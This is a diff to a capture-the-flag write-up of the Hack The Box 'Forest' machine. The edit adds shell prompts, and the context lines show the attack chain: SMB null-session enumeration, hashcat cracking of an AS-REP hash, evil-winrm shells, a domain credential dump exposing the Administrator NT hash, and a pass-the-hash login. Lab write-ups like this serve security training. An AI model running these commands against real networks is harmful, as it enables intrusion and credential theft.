@@ -62,7 +62,7 @@ target: `htb.local` and host name, which is `FOREST`. Let's add those to our `/e
 Target appears to not have any web service, so let's try SMB anonymous/NULL sessions.
 
 ```bash
-nxc smb htb.local -u '' -p '' --shares 
+$ nxc smb htb.local -u '' -p '' --shares 
       
 SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
 SMB         10.129.95.210   445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
@@ -148,7 +148,7 @@ Breakdown of the command:
 Result:
 
 ```bash
-$hashcat -m 18200 svc.hash /home/serenity/wordlists/rockyou.txt
+$ hashcat -m 18200 svc.hash /home/serenity/wordlists/rockyou.txt
 
 <SNIP>
 
@@ -164,7 +164,7 @@ Status...........: Cracked
 As you can see, we succesfully able to crack the hash and the password for the user is `s3rvice`.
 
 ```bash
-netexec smb htb.local -u 'svc-alfresco' -p 's3rvice'
+$ netexec smb htb.local -u 'svc-alfresco' -p 's3rvice'
                                                                                                                                          
 SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice
 ```
@@ -172,7 +172,7 @@ SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s
 We can see that the credentials are correct using `netexec`, we can get a `evil-winrm` shell using this command and grab the `user.txt`.
 
 ```bash
-evil-winrm -i htb.local -u 'svc-alfresco' -p 's3rvice'
+$ evil-winrm -i htb.local -u 'svc-alfresco' -p 's3rvice'
 <SNIP>
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir ../Desktop
 
@@ -328,12 +328,14 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+<SNIP>
+...
 ```
 
 as you can see we successfully able to dump the administrator hash, now we can connect over `WinRM` and grab the `root.txt`.
 
 ```bash
-evil-winrm -i htb.local -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+$ evil-winrm -i htb.local -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 <SNIP>
 *Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop
 
